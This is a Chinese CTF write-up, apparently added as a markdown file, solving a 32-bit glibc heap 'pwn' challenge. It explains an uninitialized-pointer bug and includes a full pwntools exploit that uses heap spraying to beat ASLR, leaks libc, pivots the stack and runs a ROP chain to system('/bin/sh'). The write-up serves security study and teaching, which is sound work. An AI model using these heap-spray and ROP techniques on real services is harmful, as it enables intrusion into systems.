@@ -1,0 +1,606 @@
+##  前言
+
+**二进制漏洞主要分为栈、格式化串和堆三个类别的漏洞，在现今的实际应用环境中，NX、ASLR和PIE等缓存措施基本成为标配。“格式化串漏洞”在开发流程比较严格的公司，源码静态扫描阶段运用Coverity等工具就可以完成识别整改，此类漏洞已经罕见。更有甚者会定制操作系统将libc中printf族函数对%n的支持删除，以此彻底杜绝格式化串漏洞导致的任意写。而栈类漏洞由于栈cookie的存在，并且真实环境中很难会有leak机会，利用成功率非常之低。这样利用成功率较高的只剩堆类漏洞，像UAF、堆溢出等结合堆风水（堆喷射）技术，甚至可以实现无leak利用成功，比如live555堆溢出的利用CVE-2018-4013。**
+
+传统CTF的堆类PWN题目多考察glibc中对ptmalloc机制的理解，运用布局解题，其技巧在真实环境中不夸张的讲，如果不结合堆风水，毫无用处。熟悉并运用堆风水技术，是一个PWN手成长的必经之路。
+
+本文基于《[堆喷思想在glibc
+pwn中的应用](https://xz.aliyun.com/t/7189)》，对一道更接近Realworld、设计精妙的“堆风水”题目，进行更详尽的题解分析。
+
+##  本地环境
+
+Ubuntu 16.04 x64 + libc2.23，官方exp打不成功，需要重新对libc相关的偏移和gadget进行一下调整。
+
+##  题目介绍
+
+32位ELF，PIE/ASLR/CANARY/RELRO全开，菜单题
+
+    
+    
+    puts("1\. Create many notes");
+    puts("2\. Display many notes");
+    puts("3\. Delete many notes");
+    puts("4\. Modify note");
+    puts("5\. Calling special functions");
+
+notes存储在全局数组Unit g_buffer[4096]中，Unit大小为8。
+
+    
+    
+    struct Unit
+    {
+        char *ptr;
+        unsigned int size;
+    };
+
+开局先随机malloc一块内存，使后续堆内存无法精确布局
+
+    
+    
+    int Init()
+    {
+      int v0; // eax
+      int result; // eax
+      unsigned int v2; // et1
+      unsigned int buf; // [esp+4h] [ebp-14h]
+      int fd; // [esp+8h] [ebp-10h]
+      unsigned int v5; // [esp+Ch] [ebp-Ch]
+      v5 = __readgsdword(0x14u);
+      setvbuf(stdout, 0, 2, 0);
+      setvbuf(stdin, 0, 2, 0);
+      alarm(0x12Cu);
+      fd = open("/dev/urandom", 0);
+      read(fd, &buf, 4u);
+      srand(buf);
+      v0 = rand();
+      malloc(4 * (v0 % 0x810));
+      v2 = __readgsdword(0x14u);
+      result = v2 ^ v5;
+      if ( v2 != v5 )
+        chunk_faile();
+      return result;
+    }
+
+定义好菜单函数
+
+    
+    
+    def create(sz, data):
+        p.recvuntil('>>> ')
+        p.sendline('1')
+        p.recvuntil(': ')
+        p.sendline(str(sz))
+        for buf, te in data:
+            p.recvuntil(': ')
+            p.sendline(buf)
+            p.recvuntil(': ')
+            p.sendline(str(te))
+    def display(s_idx, e_idx):
+        p.recvuntil('>>> ')
+        p.sendline('2')
+        p.recvuntil(': ')
+        p.sendline(str(s_idx))
+        p.recvuntil(': ')
+        p.sendline(str(e_idx))
+    def delete():
+        p.recvuntil('>>> ')
+        p.sendline('3')
+    def modify(idx, buf):
+        p.recvuntil('>>> ')
+        p.sendline('4')
+        p.recvuntil(': ')
+        p.sendline(str(idx))
+        p.recvuntil(': ')
+        p.sendline(buf)
+    def callfunc(idx):
+        p.recvuntil('>>> ')
+        p.sendline('5')
+        p.recvuntil(': ')
+        p.sendline(str(idx))
+
+###  Create
+
+全局数组的总体布局如下所示：
+
+![1588163996_5ea9759c5cee9.png](https://image.3001.net/images/20200628/15933233136005.png!small)
+
+分为256个组（block），每个组有16个元素，256x16 =
+4096。第1组，元素index范围为0~15；第2组，元素index范围为16~31;...第n组，元素index范围为16(n-1)
+~16*(n-1)+15
+
+    
+    
+    void __cdecl Create()
+    {
+      int type; // eax
+      unsigned int i; // [esp+8h] [ebp-20h]
+      signed int j; // [esp+Ch] [ebp-1Ch]
+      signed int l; // [esp+Ch] [ebp-1Ch]
+      int k; // [esp+10h] [ebp-18h]
+      int size; // [esp+14h] [ebp-14h]
+      _DWORD *v6; // [esp+1Ch] [ebp-Ch]
+      for ( i = 0; i <= 255 && g_buffer[16 * i].ptr; ++i )
+        ;
+      if ( i == 256 )
+      {
+        puts("Full! you can't apply for more.");
+      }
+      else
+      {
+        printf("Please enter the size of note : ");
+        size = read_choice();
+        if ( size > 0 && size <= 0x20000 )
+        {
+          for ( j = 0; j <= 15; ++j )
+          {
+            for ( k = rand() % 16; g_buffer[k + 16 * i].ptr; k = (k + 1) % 16 )
+              ;
+            g_buffer[16 * i + k].size = size;
+            g_buffer[16 * i + k].ptr = (char *)malloc(size + 4);
+            if ( !g_buffer[k + 16 * i].ptr )
+            {
+              puts("Malloc error!");
+              exit(-1);
+            }
+          }
+
+添加操作（create）一次添加1组16个元素，每个元素的size相同。顺序从0开始查找第一个空闲的组（如上图，若0、1已被使用，使用2），但组内16个元素是随机放置入的，即时间上第1个分配的内存指针不一定放在位置0。每个元素申请的内存大小为size+4（size为获取的用户输入），多申请的4字节用来保存一个int指针。
+
+    
+    
+     for ( l = 0; l <= 15; ++l )
+     {
+        printf("input note data : ");
+        read_str(g_buffer[l + 16 * i].ptr, g_buffer[16 * i + l].size);
+        TypeMenu();
+        printf("input the type : ");
+        type = read_choice();
+        v6 = &g_buffer[l + 16 * i].ptr[g_buffer[16 * i + l].size];// 末尾4字节存放一个数字
+        if ( type == 2 )
+        {
+            *v6 = &dword_56559014;
+        }
+        else if ( type > 2 )
+        {
+            if ( type == 3 )
+            {
+            *v6 = &dword_5655901C;
+            }
+            else if ( type == 4 )
+            {
+            *v6 = &dword_56559024;
+            }
+        }
+        else if ( type == 1 )
+        {
+            *v6 = &dword_5655900C;
+        }
+    }
+    printf("Note creation success! Index is : %d - %d\n", 16 * i, 16 * (i + 1) - 1);
+    g_last_blockid = i;
+
+read_str调用read读入数据，并在结尾增加\0。然后根据类型将末尾的4字节赋为不同的代码段地址，该地址可以泄露绕过PIE，但实际泄露libc就足够了。
+
+**这个4字节的赋值逻辑正是漏洞所在，如果type不为1-4中的值，就不会赋值，就可以使用上一次内存释放后残留的值。**
+
+添加结束后，将当前添加的组id（blockid）存放在全局变量g_last_blockid中，这个变量在删除中会使用。
+
+###  Display
+
+    
+    
+    void __cdecl Display()
+    {
+      unsigned int i; // [esp+4h] [ebp-14h]
+      unsigned int start_index; // [esp+8h] [ebp-10h]
+      unsigned int end_index; // [esp+Ch] [ebp-Ch]
+      printf("Please input start index : ");
+      start_index = read_choice();
+      printf("Please input end index : ");
+      end_index = read_choice();
+      if ( start_index <= 4095 && end_index <= 4095 )
+      {
+        for ( i = start_index; i <= end_index; ++i )
+          printf("Notes are : %s\n", g_buffer[i].ptr);
+      }
+      else
+      {
+        puts("Index error!");
+      }
+    }
+
+输入一个index范围，将范围内元素指针的值打印出来，\0会截断。
+
+###  Delete
+
+    
+    
+    void __cdecl Delete()
+    {
+      int i; // [esp+8h] [ebp-10h]
+      int v1; // [esp+Ch] [ebp-Ch]
+      v1 = g_last_blockid;
+      if ( g_last_blockid >= 0 && (unsigned int)g_last_blockid <= 255 )
+      {
+        for ( i = 16 * g_last_blockid; 16 * (v1 + 1) > i; ++i )
+        {
+          free(g_buffer[i].ptr);
+          g_buffer[i].ptr = 0;
+        }
+        --g_last_blockid;
+        puts("Delete success!");
+      }
+      else
+      {
+        puts("Delete error!");
+      }
+    }
+
+根据create结束时赋值的blockid，按组删除元素即一次free掉16个元素，并清除野指针。删除一组元素后g_last_blockid减1，可多次调用直到将所有block都删除。
+
+因为申请时随机位置，释放时也是随机顺序，chunk可能会放入unsorted bin中。
+
+###  Modify
+
+    
+    
+    void __cdecl Modify()
+    {
+      size_t len; // ST1C_4
+      unsigned int v1; // [esp+8h] [ebp-10h]
+      printf("Please input index : ");
+      v1 = read_choice();
+      if ( v1 <= 0xFFF && g_buffer[v1].ptr )
+      {
+        len = strlen(g_buffer[v1].ptr) + 1;
+        printf("Please enter the note : ");
+        read_str(g_buffer[v1].ptr, len);
+        puts("Edit success!");
+      }
+      else
+      {
+        puts("Index error!");
+      }
+    }
+
+修改数据，无法修改到末尾的4字节，利用时可以不使用。
+
+###  CallFunc
+
+    
+    
+    void __cdecl CallFunc()
+    {
+      int v0; // [esp+8h] [ebp-10h]
+      int v1; // [esp+Ch] [ebp-Ch]
+      printf("Please input index : ");
+      v0 = read_choice();
+      if ( v0 >= 0 && (unsigned int)v0 <= 4095 && g_buffer[v0].ptr )
+      {
+        v1 = *(_DWORD *)&g_buffer[v0].ptr[g_buffer[v0].size];
+        if ( *(_DWORD *)v1 )
+          --*(_DWORD *)v1;
+        else
+          (*(void (**)(void))(v1 + 4))();
+        puts("Call success!");
+      }
+      else
+      {
+        puts("Index error!");
+      }
+    }
+
+输入某个元素的index后:如果该元素内容末尾的后4字节指针不为0，将指针所指内容的数据减1；如果该指针为空，就call再偏移4字节的地址。
+
+结合create中的漏洞，可以完成如下功能：
+
+> 1、任意地址数据减1。这个乍看起来好像没什么用，实际有妙用，下文介绍。
+>
+> 2、任意地址跳转，直接可控制PC，但是现在并不知道跳到哪里。
+
+##  堆风水
+
+综合以上分析可知，泄露libc基址是直接目标。可以利用create中漏洞将unsortedbin中main_arena地址残留下来，但是元素内容有\0截断。那么问题就演变为如何消除\0截断了，正好callFunc中有一个任意地址数据减1功能，而这个功能需要知道chunk地址。
+
+如何获得chunk地址？开头随机分配的内存大小足以让所有暴破想法全部失效，此时就需要应用堆风水思想。
+
+反复观察可以发现，heap区间会位于0x56000000~0x59000000之间。假设选定地址0x57575757，申请0x100个0x20004大小内存（chunksize为0x20008），就可以覆盖0x56000000至0x58000000整个区间。如果将这0x100个元素的内容都填充为0x57，那么地址0x57575757中的数据也将有极高的概率是0x57575757。
+
+同样的，利用create中的未初始化漏洞，元素末尾的4字节可以是残留下来的0x57575757，再利用减1功能，结合输出就可以定位到0x57575757这个地址所在的元素index。
+
+###  malloc中的玄机
+
+要想直接申请0x100个0x20004大小内存将0x56000000~0x58000000区域填充并没有想像得这么简单。
+
+Glibc ptmalloc在topchunk的size满足不了malloc所需要字节数时，有两种策略：
+
+> 1、直接调用mmap，释放时再调用unmap
+>
+> 2、调用sbrk增大topchunk的size，然后再从topchunk中切割
+
+想要达到我们要的效果，必须是第二种策略。实际调试topchunk默认情况如下：
+
+    
+    
+    top: 0x5717e2f8 (size : 0x20d08)
+
+大小只比要申请的0x20004略大。create一次申请1组16个元素，只有第1个可以直接从topchunk切割，剩下的15个就要么直接返回mmap内存页，要么调用sbrk增大topchunk再切割。是否使用mmap，有如下条件：
+
+    
+    
+    static void *
+    sysmalloc (INTERNAL_SIZE_T nb, mstate av)
+    {
+       ...
+       if (av == NULL
+          || ((unsigned long) (nb) >= (unsigned long) (mp_.mmap_threshold)
+          && (mp_.n_mmaps < mp_.n_mmaps_max)))
+        {
+          char *mm;           /* return value from mmap call*/
+        try_mmap:
+             ...
+       ...
+    }
+
+需要申请的字节数加上chunk头后的长度大于mp_.mmapthreshold，才会进入mmap。默认情况下mp.mmap_threshold为0x20000
+
+    
+    
+    gdb-peda$ p mp_
+    $4 = struct malloc_par {
+    trim_threshold   = 0x20000
+    top_pad          = 0x20000
+    mmap_threshold   = 0x20000
+    arena_test       = 0x2
+    arena_max        = 0x0
+    n_mmaps          = 0x0
+    n_mmaps_max      = 0x10000
+    max_n_mmaps      = 0x0
+    no_dyn_threshold = 0x0
+    mmapped_mem      = 0x0
+    max_mmapped_mem  = 0x0
+    max_total_mem    = 0x0
+    sbrk_base        = 0x5717e000
+
+而在函数void __libc_free (void *mem)存在如下代码：
+
+    
+    
+    if (chunk_is_mmapped (p))                       /* release mmapped memory. */
+        {
+          /* see if the dynamic brk/mmap threshold needs adjusting */
+          if (!mp_.no_dyn_threshold
+              && p->size > mp_.mmap_threshold
+              && p->size <= DEFAULT_MMAP_THRESHOLD_MAX)
+            {
+              mp_.mmap_threshold = chunksize (p);
+              mp_.trim_threshold = 2 * mp_.mmap_threshold;
+              LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2,
+                          mp_.mmap_threshold, mp_.trim_threshold);
+            }
+          munmap_chunk (p);
+          return;
+    }
+
+也就是释放mmap申请的内存时会更新这个mp_.mmapthreshold。经过测试，create一组0x20000（实际malloc参数0x20004）大小元素再释放后，mp.mmap_threshold更新为0x21000。
+
+    
+    
+    gdb-peda$ p mp_
+    $5 = struct malloc_par {
+    trim_threshold   = 0x42000
+    top_pad          = 0x20000
+    mmap_threshold   = 0x21000
+    arena_test       = 0x2
+    arena_max        = 0x0
+    n_mmaps          = 0x0
+    n_mmaps_max      = 0x10000
+    max_n_mmaps      = 0xf
+    no_dyn_threshold = 0x0
+    mmapped_mem      = 0x0
+    max_mmapped_mem  = 0x1ef000
+    max_total_mem    = 0x0
+    sbrk_base        = 0x57572000
+
+之后再申请0x100个0x20004大小内存，就都会从topchunk切割进而达到了堆喷射的条件。
+
+###  计算堆块地址
+
+为调试方便关闭ASLR，echo 0 > /proc/sys/kernel/randomize_va_space，IDA
+Rebase0x56555000。堆喷填充令堆内大部分区域为 0x57：
+
+    
+    
+    MAGIC_BYTE = '\x57'
+    TARGET_BYTE = chr(ord(MAGIC_BYTE) - 1)
+    MAGIC_ADDR = u32(MAGIC_BYTE*4)
+    data = []
+    for i in range(0x10):
+        data.append([MAGIC_BYTE * (0x20000 - 1), 1])
+    #增大mmap阈值
+    create(0x20000, data)
+    delete()
+    #堆喷，16组共256个0x20008大小chunk，令起始堆块到MAGIC_ADDR的都填充为MAGIC_BYTE
+    for i in range(0x10):
+        create(0x20000, data)
+    #申请再释放，构造数据残留
+    data = []
+    for i in range(0x10):
+        data.append([MAGIC_BYTE * (0x1000 - 1), 1])
+    create(0x1000, data)
+    delete()
+    #create类型为0末尾4字节不赋值，这个值就是残留下来的MAGIC_ADDR
+    data = []
+    for i in range(0x10):
+        data.append([MAGIC_BYTE * (0xf0 - 1), 0])
+    create(0xf0, data)
+    #触发减1操作，此时*(MAGIC_ADDR) = MAGIC_ADDR - 1，本例中是0x57575756
+    callfunc(0x100)
+    #由于只对一个字节做了修改，其他字节还是MAGIC_BYTE，因此可以搜索到MAGIC_ADDR在哪个元素的内存域间即可获得index，并得到MAGIC_ADDR相对于此chunk开头的偏移量
+    display(0, 0x100)
+    index = 0
+    offest = 0
+    out = ''
+    for i in range(0x100):
+        out = p.recvline()
+        if TARGET_BYTE in out:
+            index = i
+            break
+    out = out[12 : ]
+    offest = out.index(TARGET_BYTE)
+
+如下图例子所示g_buffer布局，256个0x20004大小元素
+
+![1588164229_5ea976856599c.png](https://image.3001.net/images/20200628/15933231335753.png!small)
+
+地址0x57575757位于第8组元素，全局index为131，偏移量0x57575757-0x57562b88=76751。因为各个block内的元素是随机申请的，并不是地址大的index就大，得到以上信息并不能计算出0x57562b88相对于第1个申请的元素的内存地址偏移量。
+
+block在create时是顺序分配的，地址区间相连。
+
+![1588164240_5ea9769086092.png](https://image.3001.net/images/20200628/1593323178540.png!small)
+
+利用这一点，就可以从堆内存布局角度出发，通过逐个判断chunk所对应元素有没有跨越block推导确定出当前block里在时间上是第一或最后分配的chunk，从而确定堆地址。
+
+从MAGIC_ADDR所在chunk开始，逐个向前计算出该chunk对应元素在g_buffer中的位置。如何搞定？仍然使用堆喷射的方法。
+
+    
+    
+    #根据MAGIC_ADDR所属chunk对应元素index，计算得到当前block开始的index
+    block_start = (index / 0x10) * 0x10
+    #与block中时间上第1个申请的chunk之间相隔的chunk数
+    count = 1
+    #搜索到的chunk对应的元素index
+    p_index = 0
+    while count < block_start/0x10:
+        log.info("start find prev chunk count = %d" % count)
+        #堆喷构造数据残留，和上面定位MAGIC_ADDR的方法类似，使元素内容的末尾4字节填充为pre_chunkaddr，0x20008是chunksize
+        data = []
+        pre_chunkaddr = p32(MAGIC_ADDR - 0x20008 * count)
+        for i in range(0x10):
+            data.append([pre_chunkaddr * (0x1000 / 4 - 1), 1])
+        create(0x1000, data)
+        delete()
+        data = []
+        for i in range(0x10):
+            data.append([MAGIC_BYTE * (0xa0 - 1), 0])
+        create(0xa0, data)
+        log.info("start call fuc count = %d" % count)
+        #触发减1操作，第1次堆喷时有*(pre_chunkaddr) = MAGIC_ADDR，因此减1后搜索TARGET_BYTE就可以确定index了
+        callfunc(0x100)
+        display(block_start - 0x10, index + 1)
+        p_index = 0
+        out = ''
+        for i in range(index + 1 - block_start + 0x10):
+            out = p.recvline()
+            if TARGET_BYTE in out:
+                p_index = i + block_start - 0x10
+                break
+        delete()
+        #该index已在前一个block里了，证明该chunk就是该block里时间上第1个申请的
+        if p_index < block_start:
+            break
+        #否则继续向前搜索
+    count += 1
+
+###  泄露libc
+
+    
+    
+    heap_start_addr = MAGIC_ADDR - 0x20008 \* (count - 1 + block_start) - offest - 8
+
+得到堆地址以后，前面所有用来堆喷射的chunk都清除掉。开始泄露libc地址，heap_start_addr+8位置是fd，heap_start_addr+12位置是bk，存放有unsorted_bin中mainarena地址。再一次利用堆喷射，将\0截断去掉
+
+    
+    
+    data = []
+    #堆喷将空间内填充数字heap_start_addr+11
+    for i in range(0x10):
+        data.append([p32(heap_start_addr + 8 + 3 ) * (0x1000 / 4 - 1), 1])
+    create(0x1000, data)
+    delete()
+    #heap_start_addr处开始申请chunk，aaa\0填充unsortedbin的fd位置，末尾4字节利用数据残留为bk
+    data = []
+    for i in range(0x10):
+        data.append(['aaa', 0])
+    create(0xa0, data)
+    #利用减1将aaa\0修改为aaa\xff，再泄露就可以得到bk
+    callfunc(0)
+    display(0, 0x10)
+    for i in range(index + 1 - block_start + 0x10):
+        out = p.recvline()
+        out = out[12 : -1]
+        if 'aaa' != out:
+            libc_addr = u32(out[4 : 8]) + 1 - 0x1b27b0
+            break
+    log.info('libc addr is : ' + hex(libc_addr))
+
+###  栈迁移+ROP
+
+剩下的内容就比较简单了，利用CallFunc第二个点，控制PC完成栈迁移到堆，ROP调用system。
+
+    
+    
+    .text:56556314                 lea     eax, (g_buffer - 56558F98h)[ebx]
+    .text:5655631A                 mov     edx, [ebp+var_10]
+    .text:5655631D                 mov     ecx, [eax+edx*8]
+    .text:56556320                 lea     eax, (g_buffer - 56558F98h)[ebx]
+    .text:56556326                 mov     edx, [ebp+var_10]
+    .text:56556329                 mov     eax, [eax+edx*8+4]
+    .text:5655632D                 add     eax, ecx
+    .text:5655632F                 mov     eax, [eax]
+    .text:56556331                 mov     [ebp+var_C], eax
+    .text:56556334 ; 10:     if ( *(_DWORD *)v1 )
+    .text:56556334                 mov     eax, [ebp+var_C]
+    .text:56556337                 mov     eax, [eax]
+    .text:56556339                 test    eax, eax
+    .text:5655633B                 jnz     short loc_56556347
+    .text:5655633D ; 13:       (*(void (**)(void))(v1 + 4))();
+    .text:5655633D                 mov     eax, [ebp+var_C]
+    .text:56556340                 mov     eax, [eax+4]
+    .text:56556343                 call    eax
+
+call eax时ecx即元素内容的指针即指向rop链开头，令eax指向
+
+    
+    
+    xchg eax, ecx ; cld ;call dword ptr [eax]
+
+再令此时的eax指向
+
+    
+    
+    adc al, 0xf ; xchg eax, esp ;ret
+
+完成栈迁移。
+
+    
+    
+    data = []
+    #仍然用堆喷将ropchain所在地址填充到新元素末尾的4字节之后的4字节
+    for i in range(0x10):
+        data.append([p32(heap_start_addr + 12) * (0x1000 / 4 - 1), 1])
+    create(0x1000, data)
+    delete()
+    data = []
+    ropchain = p32(libc_addr + magic_gadget2) + p32(0) + p32(libc_addr+ magic_gadget1) + 'A'*3 + p32(libc_addr + system_offest) + p32(0) + p32(libc_addr + binsh_addr)
+    #令新元素内容末尾4字节为0，这样就可以劫持EIP了
+    for i in range(0x10):
+        data.append([(ropchain).ljust(0xa0 -1, '\x00'), 0])
+    create(0xa0, data)
+    callfunc(0)
+    p.sendline('id')
+    p.interactive()
+
+更易读的exp及题目：
+
+> <https://bigway.coding.net/s/425b31c6-416e-4ad6-862e-7d06e9e8108e>
+
+对比官方有如下更改：idb增强可读性；exp修改了libc相关偏移，换了个gadget（本地libc中没有原exp中的gadget）及增强了可读性。
+
+##  引用
+
+> <https://xz.aliyun.com/t/7189>
+>
+>
+> <https://introspelliam.github.io/2018/05/21/pwn/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94sysmalloc/>
+
